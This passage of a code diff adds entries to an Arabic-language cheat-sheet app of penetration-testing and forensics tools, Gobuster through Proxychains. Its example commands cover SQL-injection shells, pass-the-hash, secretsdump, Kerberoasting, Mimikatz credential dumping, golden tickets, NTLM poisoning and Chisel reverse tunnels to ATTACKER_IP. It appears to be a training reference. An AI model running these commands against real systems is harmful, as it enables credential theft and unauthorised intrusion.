+    'تحليل Firmware لأجهزة IoT والراوتر',
+    'فحص Entropy للكشف عن التشفير',
+  ],
+  install: 'sudo apt install binwalk -y',
+  version: 'binwalk --version',
+  commands: [
+    { cmd: 'binwalk firmware.bin', note: 'تحليل الملف وعرض ما هو مضمن' },
+    { cmd: 'binwalk -e firmware.bin', note: 'استخراج كل الملفات المضمنة' },
+    { cmd: 'binwalk --dd=".*" firmware.bin', note: 'استخراج كل أنواع الملفات' },
+    { cmd: 'binwalk -E file.bin', note: 'تحليل Entropy (يكشف التشفير)' },
+  ],
+  tips: ['💡 المخرجات تُحفظ في مجلد _filename.extracted'],
+  related: ['Foremost', 'Steghide', 'ExifTool', 'dd'],
+},
+
+{
+  id: 25, name: 'ExifTool', icon: '📷', color: 'rgba(255,200,100,0.12)',
+  short: 'قراءة وكتابة بيانات EXIF لكل أنواع الملفات',
+  cat: 'ctf', tags: ['ctf','forensics','recon'],
+  desc: `ExifTool هو برنامج Perl لقراءة وكتابة وتعديل بيانات الـ Metadata في الملفات. يدعم مئات صيغ الملفات ومئات أنواع الـ Metadata. في CTF يُستخدم لاستخراج معلومات مخفية في بيانات EXIF. في التحقيق الجنائي يكشف متى وأين التُقطت صورة.`,
+  features: [
+    'قراءة GPS Coordinates من الصور',
+    'تحديد نوع الكاميرا وإعدادات التصوير',
+    'اكتشاف بيانات مخفية في Metadata',
+    'دعم PDF, Word, MP3, MP4, وغيرها',
+    'تعديل وحذف الـ Metadata',
+  ],
+  install: 'sudo apt install libimage-exiftool-perl -y',
+  version: 'exiftool -ver',
+  commands: [
+    { cmd: 'exiftool image.jpg', note: 'عرض كل بيانات EXIF' },
+    { cmd: 'exiftool -gpslatitude -gpslongitude image.jpg', note: 'استخراج الموقع الجغرافي' },
+    { cmd: 'exiftool -all= image.jpg', note: 'حذف كل الـ Metadata من الصورة' },
+    { cmd: 'exiftool -r /path/to/folder/', note: 'فحص كل ملفات مجلد بشكل متكرر' },
+  ],
+  tips: ['💡 في CTF: ابحث دائماً عن الـ EXIF قبل أي أداة أخرى'],
+  related: ['Steghide', 'Binwalk', 'foremost', 'strings'],
+},
+
+// ===== TOOLS 26-55 (30 NEW TOOLS) =====
+{
+  id: 26, name: 'Gobuster', icon: '🗂️', color: 'rgba(0,255,200,0.12)',
+  short: 'أداة Brute Force لاكتشاف المجلدات والملفات والـ Subdomains',
+  cat: 'webapp', tags: ['webapp','recon','scanning'],
+  desc: `Gobuster أداة مكتوبة بلغة Go لاكتشاف المجلدات والملفات المخفية على خوادم الويب، واكتشاف النطاقات الفرعية. أسرع من DirBuster وتعمل من سطر الأوامر. تدعم عدة أوضاع: dir، dns، vhost، fuzz.`,
+  features: ['اكتشاف المجلدات والملفات المخفية', 'فحص النطاقات الفرعية (DNS Mode)', 'Virtual Host Enumeration', 'دعم امتدادات محددة', 'سرعة عالية بسبب Go'],
+  install: 'sudo apt install gobuster -y',
+  version: 'gobuster version',
+  commands: [
+    { cmd: 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt', note: 'فحص المجلدات الأساسي' },
+    { cmd: 'gobuster dir -u http://target.com -w big.txt -x php,html,txt,bak', note: 'فحص امتدادات محددة' },
+    { cmd: 'gobuster dns -d target.com -w subdomains.txt', note: 'اكتشاف Subdomains' },
+    { cmd: 'gobuster dir -u http://target.com -w common.txt -t 50 -o results.txt', note: 'فحص بـ 50 thread وحفظ النتائج' },
+  ],
+  tips: ['💡 SecLists أفضل مجموعة قوائم: apt install seclists', '💡 -x php,asp,aspx للأهداف الشائعة'],
+  related: ['Feroxbuster', 'ffuf', 'DirBuster', 'Dirsearch'],
+},
+{
+  id: 27, name: 'ffuf', icon: '🎯', color: 'rgba(255,100,0,0.12)',
+  short: 'أداة Fuzzing خفيفة وسريعة للويب',
+  cat: 'webapp', tags: ['webapp','fuzzing'],
+  desc: `ffuf (Fuzz Faster U Fool) أداة مكتوبة بـ Go لـ Fuzzing طلبات الويب. تدعم فحص المجلدات، النطاقات الفرعية، البارامترات، Headers وكل عناصر الطلب. أسرع من Gobuster في بعض الحالات.`,
+  features: ['فحص المجلدات والملفات', 'Fuzzing البارامترات', 'Subdomain Enumeration', 'فلترة النتائج بـ Status Code، Size، Words', 'دعم تعدد الـ Wordlists'],
+  install: 'sudo apt install ffuf -y',
+  version: 'ffuf -V',
+  commands: [
+    { cmd: 'ffuf -w wordlist.txt -u http://target.com/FUZZ', note: 'فحص المجلدات' },
+    { cmd: 'ffuf -w subs.txt -u http://FUZZ.target.com -H "Host: FUZZ.target.com"', note: 'اكتشاف Subdomains' },
+    { cmd: 'ffuf -w params.txt -u "http://target.com/page?FUZZ=value"', note: 'فحص البارامترات' },
+    { cmd: 'ffuf -w wordlist.txt -u http://target.com/FUZZ -mc 200,301,302 -o results.json', note: 'فلترة النتائج وحفظها' },
+  ],
+  tips: ['💡 -fc 404 لفلترة صفحات 404', '💡 -ac لتصفية الردود المتطابقة تلقائياً'],
+  related: ['Gobuster', 'Feroxbuster', 'wfuzz', 'Burp Intruder'],
+},
+{
+  id: 28, name: 'Feroxbuster', icon: '🚀', color: 'rgba(200,0,255,0.12)',
+  short: 'ماسح مجلدات سريع مع دعم البحث التكراري',
+  cat: 'webapp', tags: ['webapp','scanning'],
+  desc: `Feroxbuster أداة Rust للبحث التكراري في مجلدات الويب. أسرع بكثير من Gobuster وتدعم التعمق التلقائي في المجلدات المكتشفة. خيار ممتاز لاكتشاف هيكل تطبيقات الويب المعقدة.`,
+  features: ['البحث التكراري التلقائي', 'سرعة عالية (Rust)', 'إلغاء وإيقاف مؤقت للفحص', 'تصفية متقدمة للنتائج', 'دعم TLS وProxy'],
+  install: 'sudo apt install feroxbuster -y',
+  version: 'feroxbuster --version',
+  commands: [
+    { cmd: 'feroxbuster -u http://target.com', note: 'فحص بسيط' },
+    { cmd: 'feroxbuster -u http://target.com -w big.txt -x php,html --depth 3', note: 'فحص بعمق 3 مستويات' },
+    { cmd: 'feroxbuster -u http://target.com --silent -o results.txt', note: 'حفظ النتائج بهدوء' },
+  ],
+  tips: ['💡 --depth للتحكم في عمق البحث التكراري', '💡 Ctrl+C يُوقف الفحص مؤقتاً'],
+  related: ['Gobuster', 'ffuf', 'DirBuster'],
+},
+{
+  id: 29, name: 'Nikto', icon: '🔎', color: 'rgba(0,150,255,0.12)',
+  short: 'فاحص خوادم الويب الشامل للثغرات المعروفة',
+  cat: 'webapp', tags: ['webapp','scanning'],
+  desc: `Nikto ماسح ويب مفتوح المصدر يفحص خوادم الويب للثغرات المعروفة والإعدادات الخاطئة. يفحص أكثر من 6700 عنصر خطر ويدعم SSL. شائع الاستخدام في اختبارات الاختراق كأول فحص على خادم ويب.`,
+  features: ['فحص 6700+ إعداد خاطئ وثغرة معروفة', 'دعم SSL/HTTPS', 'فحص ملفات التكوين الحساسة', 'تقارير بصيغ HTML، XML، CSV', 'دعم الـ Proxy'],
+  install: 'sudo apt install nikto -y',
+  version: 'nikto -Version',
+  commands: [
+    { cmd: 'nikto -h http://target.com', note: 'فحص أساسي' },
+    { cmd: 'nikto -h https://target.com -ssl', note: 'فحص HTTPS' },
+    { cmd: 'nikto -h target.com -p 8080', note: 'فحص منفذ محدد' },
+    { cmd: 'nikto -h target.com -o report.html -Format html', note: 'حفظ تقرير HTML' },
+    { cmd: 'nikto -h target.com -useproxy http://127.0.0.1:8080', note: 'عبر Burp Proxy' },
+  ],
+  tips: ['⚠️ Nikto يترك أثراً واضحاً في logs — استخدمه على مستهدفات مرخصة', '💡 نتائج OSVDB → ابحث عنها في CVE للتفاصيل'],
+  related: ['WPScan', 'ZAP', 'Nmap NSE', 'w3af'],
+},
+{
+  id: 30, name: 'WPScan', icon: '🌩️', color: 'rgba(255,50,50,0.12)',
+  short: 'الأداة الأساسية لفحص مواقع WordPress',
+  cat: 'webapp', tags: ['webapp','scanning'],
+  desc: `WPScan أداة متخصصة في فحص مواقع WordPress وإيجاد الثغرات في WordPress Core، الإضافات (Plugins)، والقوالب (Themes). تملك قاعدة بيانات WPVulnDB المتخصصة.`,
+  features: ['فحص WordPress Core للثغرات', 'Enumerate المستخدمين والإضافات والقوالب', 'Brute Force كلمات المرور', 'قاعدة بيانات ثغرات متخصصة', 'دعم Token API لنتائج أكثر'],
+  install: 'sudo apt install wpscan -y',
+  version: 'wpscan --version',
+  commands: [
+    { cmd: 'wpscan --url http://target.com', note: 'فحص أساسي' },
+    { cmd: 'wpscan --url http://target.com --enumerate u,p,t', note: 'فحص Users, Plugins, Themes' },
+    { cmd: 'wpscan --url http://target.com -U admin -P rockyou.txt', note: 'Brute Force على wp-login' },
+    { cmd: 'wpscan --url http://target.com --api-token YOUR_TOKEN', note: 'مع API Token لنتائج أكثر' },
+  ],
+  tips: ['💡 سجّل مجاناً على wpscan.com للحصول على API Token', '💡 تحديث دائم: wpscan --update'],
+  related: ['Nikto', 'Burp Suite', 'CMSmap', 'Joomscan'],
+},
+{
+  id: 31, name: 'SQLMap', icon: '💉', color: 'rgba(255,0,128,0.12)',
+  short: 'استغلال SQL Injection تلقائياً',
+  cat: 'webapp', tags: ['webapp','exploitation'],
+  desc: `SQLMap أداة مفتوحة المصدر تكتشف وتستغل ثغرات SQL Injection تلقائياً. تدعم MySQL, PostgreSQL, MSSQL, Oracle, SQLite وغيرها. يمكنها استخراج البيانات، الحصول على Shell، قراءة/كتابة الملفات.`,
+  features: ['اكتشاف تلقائي لأنواع SQLi', 'استخراج قواعد البيانات والجداول والبيانات', 'الحصول على OS Shell', 'دعم 6 أنواع هجوم: boolean, error, union, stacked, time, out-of-band', 'دعم Cookies وHeaders للأهداف المحمية'],
+  install: 'sudo apt install sqlmap -y',
+  version: 'sqlmap --version',
+  commands: [
+    { cmd: 'sqlmap -u "http://target.com/?id=1" --dbs', note: 'اكتشاف قواعد البيانات' },
+    { cmd: 'sqlmap -u "http://target.com/?id=1" -D db -T users --dump', note: 'استخراج جدول users' },
+    { cmd: 'sqlmap -u "http://target.com" --data="id=1" --level 5 --risk 3', note: 'فحص عميق عبر POST' },
+    { cmd: 'sqlmap -u "http://target.com/?id=1" --os-shell', note: 'الحصول على OS Shell' },
+  ],
+  tips: ['💡 ابدأ بـ --level 1 --risk 1 ثم زد تدريجياً', '⚠️ --os-shell يحتاج FILE privilege في MySQL'],
+  related: ['Burp Suite', 'Havij', 'jSQL Injection'],
+},
+{
+  id: 32, name: 'CrackMapExec', icon: '🕸️', color: 'rgba(255,165,0,0.12)',
+  short: 'الأداة الأساسية لاختبار Active Directory والشبكات Windows',
+  cat: 'exploitation', tags: ['exploitation','active-directory','windows'],
+  desc: `CrackMapExec (CME) أداة شاملة لاختبار أمان شبكات Windows وActive Directory. تدعم عمليات Lateral Movement، Pass-the-Hash، Kerberoasting، وغيرها. تُعدّ أساسية في أي اختبار اختراق على بيئات Windows.`,
+  features: ['Pass-the-Hash على نطاق كامل', 'Spraying كلمات المرور', 'تشغيل أوامر عن بُعد (WMI, SMB)', 'استخراج Secrets و SAM', 'دعم LDAP وMSSQL وFTP'],
+  install: 'sudo apt install crackmapexec -y',
+  version: 'crackmapexec --version',
+  commands: [
+    { cmd: 'crackmapexec smb 192.168.1.0/24', note: 'فحص أجهزة Windows على الشبكة' },
+    { cmd: 'crackmapexec smb 192.168.1.10 -u admin -p Password123', note: 'اختبار credentials' },
+    { cmd: 'crackmapexec smb 192.168.1.10 -u admin -H NTLM_HASH', note: 'Pass-the-Hash' },
+    { cmd: 'crackmapexec smb 192.168.1.10 -u admin -p pass -x "whoami"', note: 'تنفيذ أمر عن بُعد' },
+    { cmd: 'crackmapexec smb 192.168.1.10 -u admin -p pass --sam', note: 'استخراج SAM Hashes' },
+  ],
+  tips: ['💡 --local-auth للمصادقة المحلية بدون domain', '⚠️ Password Spraying بحذر — قد يُقفل الحسابات'],
+  related: ['Impacket', 'Mimikatz', 'BloodHound', 'Responder'],
+},
+{
+  id: 33, name: 'Impacket', icon: '📦', color: 'rgba(0,255,128,0.12)',
+  short: 'مجموعة أدوات Python لاختبار بروتوكولات Windows',
+  cat: 'exploitation', tags: ['exploitation','active-directory','windows'],
+  desc: `Impacket مجموعة أدوات Python لاختبار بروتوكولات الشبكة المستخدمة في Windows: SMB, RDP, MSRPC, LDAP, Kerberos. تشمل أدوات مثل: psexec, secretsdump, GetUserSPNs, smbclient.`,
+  features: ['PsExec عن بُعد', 'استخراج SAM وLSASS', 'Kerberoasting وAS-REP Roasting', 'Pass-the-Hash وPass-the-Ticket', 'DCSync Attack'],
+  install: 'sudo apt install python3-impacket -y',
+  version: 'impacket-psexec --help',
+  commands: [
+    { cmd: 'impacket-psexec corp.local/admin:pass@192.168.1.10', note: 'Shell عبر PsExec' },
+    { cmd: 'impacket-secretsdump corp.local/admin:pass@DC_IP', note: 'استخراج كل الهاشات من DC' },
+    { cmd: 'impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -outputfile kerb.txt', note: 'Kerberoasting' },
+    { cmd: 'impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip DC_IP', note: 'AS-REP Roasting' },
+    { cmd: 'impacket-smbclient corp.local/user:pass@192.168.1.10', note: 'الوصول لـ SMB Shares' },
+  ],
+  tips: ['💡 impacket-secretsdump لاستخراج كل credentials الـ Domain Controller', '💡 impacket-wmiexec و smbexec بدائل لـ psexec'],
+  related: ['CrackMapExec', 'Mimikatz', 'BloodHound'],
+},
+{
+  id: 34, name: 'BloodHound', icon: '🐕', color: 'rgba(255,0,50,0.12)',
+  short: 'تحليل مسارات الهجوم في Active Directory بصرياً',
+  cat: 'exploitation', tags: ['exploitation','active-directory'],
+  desc: `BloodHound أداة تحليل Active Directory تُظهر مسارات الهجوم بصرياً باستخدام Graph Theory. تساعد المهاجمين في إيجاد أقصر طريق لامتيازات Domain Admin والمدافعين في اكتشاف المسارات الخطيرة قبل المهاجمين.`,
+  features: ['رسم العلاقات بين المستخدمين والأجهزة والصلاحيات', 'إيجاد مسارات الـ Attack Path تلقائياً', 'Kerberoastable وAS-REP Roastable Users', 'ACL Attack Paths', 'جمع البيانات بـ SharpHound أو bloodhound-python'],
+  install: 'sudo apt install bloodhound -y',
+  version: 'bloodhound --version 2>/dev/null || echo "GUI Tool"',
+  commands: [
+    { cmd: 'bloodhound-python -u user -p pass -d corp.local -ns DC_IP -c All', note: 'جمع بيانات AD (من Linux)' },
+    { cmd: 'neo4j console &\nbloodhound &', note: 'تشغيل BloodHound مع Neo4j' },
+    { cmd: '# داخل BloodHound:\n# Upload Data → اختر JSON files\n# Find Shortest Paths to Domain Admins', note: 'تحليل مسارات الهجوم' },
+  ],
+  tips: ['💡 Cypher Queries قوية جداً للبحث المخصص', '💡 "Find Kerberoastable Users" من قوائم Pre-built Analysis'],
+  related: ['CrackMapExec', 'Impacket', 'Mimikatz', 'PowerView'],
+},
+{
+  id: 35, name: 'Responder', icon: '🎧', color: 'rgba(100,200,255,0.12)',
+  short: 'اعتراض هاشات NTLM عبر بروتوكولات الشبكة المحلية',
+  cat: 'exploitation', tags: ['exploitation','network','active-directory'],
+  desc: `Responder أداة للاستجابة لبروتوكولات الاستعلام على الشبكة المحلية (LLMNR, NBT-NS, mDNS) وجمع هاشات NTLM. عندما يبحث جهاز عن خادم غير موجود، Responder يتظاهر بأنه الخادم ويعترض الـ credentials.`,
+  features: ['اعتراض NTLMv1/NTLMv2 Hashes', 'Poisoning لـ LLMNR و NBT-NS و mDNS', 'خدمات مضمنة: HTTP, SMB, LDAP, FTP, DNS', 'تحويل الهاشات لـ hashcat/john'],
+  install: 'sudo apt install responder -y',
+  version: 'responder --version',
+  commands: [
+    { cmd: 'sudo responder -I eth0 -wrf', note: 'تشغيل Responder على الشبكة' },
+    { cmd: 'sudo responder -I eth0 -A', note: 'وضع Analyze (مراقبة بدون poisoning)' },
+    { cmd: '# بعد الحصول على الهاشات:\nhashcat -m 5600 ntlmv2_hashes.txt rockyou.txt', note: 'كسر هاشات NTLMv2' },
+  ],
+  tips: ['💡 الهاشات تُحفظ في /usr/share/responder/logs/', '⚠️ استخدمه في بيئات مرخصة فقط — يؤثر على الشبكة كلها'],
+  related: ['CrackMapExec', 'Impacket', 'Inveigh'],
+},
+{
+  id: 36, name: 'Subfinder', icon: '🌍', color: 'rgba(0,200,100,0.12)',
+  short: 'اكتشاف النطاقات الفرعية بطريقة احترافية',
+  cat: 'recon', tags: ['recon','scanning'],
+  desc: `Subfinder أداة Go لاكتشاف النطاقات الفرعية (Subdomains) من عشرات المصادر السلبية: APIs مختلفة، Certificate Transparency Logs، DNSdumpster، وغيرها. أسرع وأشمل من الأدوات التقليدية.`,
+  features: ['استعلام من 40+ مصدر', 'نتائج Passive (لا تترك أثراً)', 'سريع جداً (Go)', 'تصدير النتائج بصيغ متعددة', 'دعم API Keys لنتائج أكثر'],
+  install: 'sudo apt install subfinder -y',
+  version: 'subfinder -version',
+  commands: [
+    { cmd: 'subfinder -d target.com', note: 'اكتشاف Subdomains' },
+    { cmd: 'subfinder -d target.com -o subs.txt', note: 'حفظ النتائج' },
+    { cmd: 'subfinder -dL domains.txt -o all_subs.txt', note: 'فحص قائمة نطاقات' },
+    { cmd: 'subfinder -d target.com -all -v', note: 'فحص شامل مع تفاصيل' },
+  ],
+  tips: ['💡 أضف API Keys في ~/.config/subfinder/provider-config.yaml للنتائج الأفضل'],
+  related: ['theHarvester', 'Amass', 'Assetfinder', 'dnsrecon'],
+},
+{
+  id: 37, name: 'Amass', icon: '🌐', color: 'rgba(255,200,0,0.12)',
+  short: 'أداة OSINT شاملة لرسم خريطة البنية التحتية',
+  cat: 'recon', tags: ['recon','scanning'],
+  desc: `Amass أداة قوية جداً من OWASP لجمع معلومات DNS واكتشاف النطاقات الفرعية وتحليل بنية الشبكة. تجمع البيانات من عشرات المصادر وترسم خريطة كاملة للبنية التحتية.`,
+  features: ['Passive و Active Enumeration', 'Certificate Transparency', 'ASN و BGP Analysis', 'رسم Graph للبنية التحتية', 'تكامل مع Maltego'],
+  install: 'sudo apt install amass -y',
+  version: 'amass -version',
+  commands: [
+    { cmd: 'amass enum -d target.com', note: 'Enumeration أساسي' },
+    { cmd: 'amass enum -passive -d target.com', note: 'Passive فقط (أهدأ)' },
+    { cmd: 'amass enum -d target.com -o amass_results.txt', note: 'حفظ النتائج' },
+    { cmd: 'amass intel -d target.com -whois', note: 'WHOIS Intelligence' },
+  ],
+  tips: ['💡 amass viz -d3 لعرض النتائج بصرياً', '💡 amass db لإدارة نتائج الجلسات السابقة'],
+  related: ['Subfinder', 'theHarvester', 'Recon-ng'],
+},
+{
+  id: 38, name: 'Nuclei', icon: '⚛️', color: 'rgba(0,150,255,0.12)',
+  short: 'ماسح ثغرات سريع بقوالب YAML',
+  cat: 'scanning', tags: ['scanning','webapp','network'],
+  desc: `Nuclei ماسح ثغرات قابل للتخصيص يعتمد على قوالب YAML. يحتوي مستودع templates الرسمي على آلاف القوالب لاكتشاف CVEs، Misconfigurations، Exposures وغيرها. سرعة عالية ودقة جيدة.`,
+  features: ['9000+ Template جاهز', 'اكتشاف CVEs المعروفة', 'فحص Misconfigurations', 'Exposed Files والـ Panels الإدارية', 'قوالب مخصصة بـ YAML', 'سريع جداً (Go)'],
+  install: 'sudo apt install nuclei -y && nuclei -update-templates',
+  version: 'nuclei -version',
+  commands: [
+    { cmd: 'nuclei -u http://target.com', note: 'فحص أساسي' },
+    { cmd: 'nuclei -u http://target.com -t cves/', note: 'فحص CVEs فقط' },
+    { cmd: 'nuclei -l targets.txt -t exposures/', note: 'فحص قائمة أهداف' },
+    { cmd: 'nuclei -u http://target.com -severity critical,high', note: 'الثغرات الخطيرة فقط' },
+  ],
+  tips: ['💡 nuclei -update-templates لتحديث القوالب', '💡 -stats لعرض إحصائيات الفحص'],
+  related: ['Nessus', 'OpenVAS', 'Nikto', 'ZAP'],
+},
+{
+  id: 39, name: 'Mimikatz', icon: '🐱', color: 'rgba(255,165,0,0.12)',
+  short: 'أداة استخراج Credentials من ذاكرة Windows',
+  cat: 'exploitation', tags: ['exploitation','windows','active-directory'],
+  desc: `Mimikatz أداة Windows لاستخراج كلمات المرور والـ Hashes والـ Kerberos Tickets من ذاكرة النظام. طورها Benjamin Delpy. تُعدّ أخطر أداة في عالم اختبار اختراق Windows. تدعم عمليات: Dumping Credentials، Pass-the-Hash، Golden Ticket، DCSync.`,
+  features: ['استخراج كلمات مرور نصية من LSASS', 'Dump SAM وNTLM Hashes', 'Golden Ticket وSilver Ticket', 'DCSync بدون اتصال جسدي', 'Pass-the-Hash وPass-the-Ticket'],
+  install: '# تنزيل: https://github.com/gentilkiwi/mimikatz',
+  version: 'mimikatz.exe version',
+  commands: [
+    { cmd: 'privilege::debug\nsekurlsa::logonpasswords', note: 'استخراج كلمات مرور نصية' },
+    { cmd: 'lsadump::sam', note: 'استخراج هاشات SAM Database' },
+    { cmd: 'lsadump::dcsync /domain:corp.local /user:krbtgt', note: 'DCSync لسرقة KRBTGT Hash' },
+    { cmd: 'kerberos::golden /domain:corp.local /sid:S-1-5-21-... /rc4:KRBTGT_HASH /user:fakeadmin', note: 'إنشاء Golden Ticket' },
+  ],
+  tips: ['⚠️ Mimikatz يُكتشف فوراً من AV/EDR — استخدمه في بيئات اختبار', '💡 في Meterpreter: load kiwi لتشغيل Mimikatz مدمجاً'],
+  related: ['CrackMapExec', 'Impacket', 'SharpKatz'],
+},
+{
+  id: 40, name: 'Volatility', icon: '🧠', color: 'rgba(200,100,255,0.12)',
+  short: 'تحليل صور الذاكرة RAM للتحقيق الجنائي',
+  cat: 'forensics', tags: ['forensics','malware'],
+  desc: `Volatility إطار تحليل جنائي لصور الذاكرة RAM. يستطيع استخراج: قائمة العمليات، الاتصالات الشبكية، الـ Registry، البرامج الخبيثة، بيانات الاعتماد المخزنة. يدعم Windows وLinux وMac.`,
+  features: ['تحليل Windows وLinux وMac Memory', 'استخراج العمليات والـ DLLs', 'الاتصالات الشبكية', 'اكتشاف Process Injection وDLL Injection', 'استخراج كلمات المرور والـ Hashes'],
+  install: 'sudo apt install volatility3 -y',
+  version: 'volatility3 --version 2>/dev/null || vol.py --info',
+  commands: [
+    { cmd: 'volatility3 -f memory.dmp windows.pslist', note: 'قائمة العمليات' },
+    { cmd: 'volatility3 -f memory.dmp windows.netscan', note: 'الاتصالات الشبكية' },
+    { cmd: 'volatility3 -f memory.dmp windows.hashdump', note: 'استخراج NTLM Hashes' },
+    { cmd: 'volatility3 -f memory.dmp windows.dumpfiles --pid 1234', note: 'تفريغ ملفات عملية محددة' },
+    { cmd: 'volatility3 -f memory.dmp windows.malfind', note: 'البحث عن كود خبيث مُضمَّن' },
+  ],
+  tips: ['💡 malfind يكشف Process Injection والكود الخبيث في الذاكرة', '💡 vol.py لـ Volatility 2 أو volatility3 للإصدار الجديد'],
+  related: ['Autopsy', 'Rekall', 'MemProcFS'],
+},
+{
+  id: 41, name: 'Autopsy', icon: '🔬', color: 'rgba(255,100,100,0.12)',
+  short: 'منصة التحقيق الجنائي الرقمي الكاملة',
+  cat: 'forensics', tags: ['forensics'],
+  desc: `Autopsy منصة تحقيق جنائي رقمي ذات واجهة رسومية قوية. تُستخدم من قِبل وكالات إنفاذ القانون والمحققين. تحلل صور الأقراص الصلبة واستعادة الملفات المحذوفة والبريد الإلكتروني وسجل التصفح وغيرها.`,
+  features: ['تحليل صور الأقراص (dd, E01, VMDK)', 'استعادة الملفات المحذوفة', 'تحليل سجل المتصفح والبريد', 'Timeline Analysis', 'بحث بالـ Hash (يستيراد قوائم NSRL)', 'Keyword Search'],
+  install: 'sudo apt install autopsy -y',
+  version: 'autopsy --version 2>/dev/null',
+  commands: [
+    { cmd: 'autopsy &\n# افتح: http://127.0.0.1:9999/autopsy', note: 'تشغيل Autopsy الواجهة القديمة' },
+    { cmd: '# الإصدار 4 (GUI مستقل):\n# New Case → Add Data Source → Disk Image\n# ثم Run Ingest Modules', note: 'Autopsy 4 الواجهة الجديدة' },
+  ],
+  tips: ['💡 HashLookup يتحقق من الملفات ضد قواعد بيانات NSRL', '💡 Timeline يعرض كل نشاطات الملفات زمنياً'],
+  related: ['Volatility', 'Sleuth Kit', 'FTK', 'dd'],
+},
+{
+  id: 42, name: 'theHarvester', icon: '🌾', color: 'rgba(200,255,0,0.12)',
+  short: 'جمع الإيميلات والنطاقات ومعلومات OSINT تلقائياً',
+  cat: 'recon', tags: ['recon','osint'],
+  desc: `theHarvester أداة لجمع المعلومات من المصادر المفتوحة: إيميلات، نطاقات فرعية، IPs، أسماء موظفين. تستعلم من: Google, Bing, LinkedIn, Shodan, Hunter.io وغيرها. أساسية في مرحلة Reconnaissance.`,
+  features: ['جمع إيميلات الشركة من Google/Bing', 'اكتشاف Subdomains', 'البحث في LinkedIn للموظفين', 'استعلام Shodan للأجهزة', 'تصدير HTML وXML'],
+  install: 'sudo apt install theharvester -y',
+  version: 'theHarvester --help',
+  commands: [
+    { cmd: 'theHarvester -d target.com -l 500 -b google', note: 'جمع من Google' },
+    { cmd: 'theHarvester -d target.com -b all -l 200', note: 'جمع من كل المصادر' },
+    { cmd: 'theHarvester -d target.com -b linkedin -l 100', note: 'البحث عن الموظفين في LinkedIn' },
+    { cmd: 'theHarvester -d target.com -b shodan', note: 'استعلام Shodan' },
+    { cmd: 'theHarvester -d target.com -b all -f results.html', note: 'تصدير HTML Report' },
+  ],
+  tips: ['💡 -b shodan يحتاج Shodan API Key', '💡 Hunter.io يوفر إيميلات شركات بدقة عالية'],
+  related: ['Maltego', 'Recon-ng', 'Shodan', 'Amass'],
+},
+{
+  id: 43, name: 'Maltego', icon: '🕸️', color: 'rgba(100,100,255,0.12)',
+  short: 'تحليل OSINT وعلاقات الكيانات بصرياً',
+  cat: 'recon', tags: ['recon','osint'],
+  desc: `Maltego أداة OSINT احترافية لتحليل وتصور العلاقات بين الكيانات: نطاقات، IPs، إيميلات، موظفون، شركات. تستخدم "Transforms" لجلب البيانات من مصادر متعددة وعرضها كـ Graph تفاعلي.`,
+  features: ['واجهة رسومية Graph تفاعلية', 'Transforms تلقائية لجلب البيانات', 'تحليل DNS وIP وWhois', 'ربط الكيانات تلقائياً', 'Maltego CE مجاني (محدود)'],
+  install: 'sudo apt install maltego -y',
+  version: '# GUI Tool',
+  commands: [
+    { cmd: 'maltego &', note: 'تشغيل Maltego GUI' },
+    { cmd: '# New Graph → Drag Domain entity\n# Right-Click → Run Transforms\n# "To DNS Name" → "To IP Address"', note: 'بدء تحليل نطاق' },
+  ],
+  tips: ['💡 Community Edition: حد 12 نتيجة لكل Transform', '💡 Maltego Pro بدون حدود مع APIs مدفوعة'],
+  related: ['theHarvester', 'Recon-ng', 'SpiderFoot'],
+},
+{
+  id: 44, name: 'Trivy', icon: '🐙', color: 'rgba(0,200,200,0.12)',
+  short: 'فاحص ثغرات صور Docker وملفات IaC',
+  cat: 'cloud', tags: ['cloud','scanning'],
+  desc: `Trivy ماسح شامل للثغرات مفتوح المصدر من Aqua Security. يفحص: صور Docker وOCI، ملفات Terraform وHelm، Git Repositories، الملفات المضغوطة. يكتشف ثغرات المكتبات والحزم والـ Misconfigurations.`,
+  features: ['فحص صور Docker للثغرات', 'فحص Terraform وHelmCharts', 'فحص packages.json, requirements.txt', 'اكتشاف Secrets في الكود', 'تقارير بصيغ JSON, Table, SARIF'],
+  install: 'sudo apt install trivy -y',
+  version: 'trivy --version',
+  commands: [
+    { cmd: 'trivy image nginx:latest', note: 'فحص صورة Docker' },
+    { cmd: 'trivy fs /path/to/code', note: 'فحص كود مصدري' },
+    { cmd: 'trivy image --severity CRITICAL,HIGH myapp:v1.0', note: 'الثغرات الخطيرة فقط' },
+    { cmd: 'trivy config terraform/', note: 'فحص ملفات Terraform' },
+    { cmd: 'trivy repo https://github.com/user/repo', note: 'فحص Repository مباشرة' },
+  ],
+  tips: ['💡 trivy image --exit-code 1 --severity CRITICAL للـ CI/CD Pipeline', '💡 تحديث DB: trivy image --download-db-only'],
+  related: ['Clair', 'Grype', 'Snyk', 'Docker Bench'],
+},
+{
+  id: 45, name: 'Chisel', icon: '🚇', color: 'rgba(255,200,100,0.12)',
+  short: 'نفق TCP/UDP سريع عبر HTTP للـ Pivoting',
+  cat: 'network', tags: ['network','exploitation'],
+  desc: `Chisel أداة TCP/UDP Tunneling سريعة عبر HTTP تُستخدم في عمليات Pivoting. تتيح الوصول لأجزاء معزولة من الشبكة عبر SOCKS5 Proxy. مفيدة جداً في اختبارات الاختراق عند الحاجة للتحرك داخل الشبكة.`,
+  features: ['SOCKS5 Proxy Tunneling', 'Port Forwarding', 'يعمل عبر HTTP (يتجاوز Firewalls)', 'مشفر بـ SSH', 'خفيف وسريع (Go)'],
+  install: '# تنزيل: https://github.com/jpillora/chisel/releases',
+  version: 'chisel --version',
+  commands: [
+    { cmd: '# المهاجم (Server):\n./chisel server -p 8080 --reverse', note: 'تشغيل Chisel Server' },
+    { cmd: '# الضحية (Client):\n./chisel client ATTACKER_IP:8080 R:socks', note: 'تشغيل SOCKS Proxy' },
+    { cmd: '# Port Forwarding:\n./chisel client ATTACKER_IP:8080 R:8888:192.168.2.10:80', note: 'إعادة توجيه منفذ داخلي' },
+    { cmd: '# استخدام SOCKS:\nproxychains nmap -sT -p 80,443 10.10.10.1', note: 'استخدام Proxychains مع Chisel' },
+  ],
+  tips: ['💡 proxychains4 يوجه كل الأوامر عبر SOCKS Proxy', '💡 ligolo-ng بديل حديث وأسرع'],
+  related: ['Proxychains', 'Ligolo-ng', 'SSH Tunneling', 'Metasploit route'],
+},
+{
+  id: 46, name: 'Proxychains', icon: '⛓️', color: 'rgba(150,100,200,0.12)',
+  short: 'توجيه أدوات Linux عبر Proxy',
+  cat: 'network', tags: ['network','exploitation'],
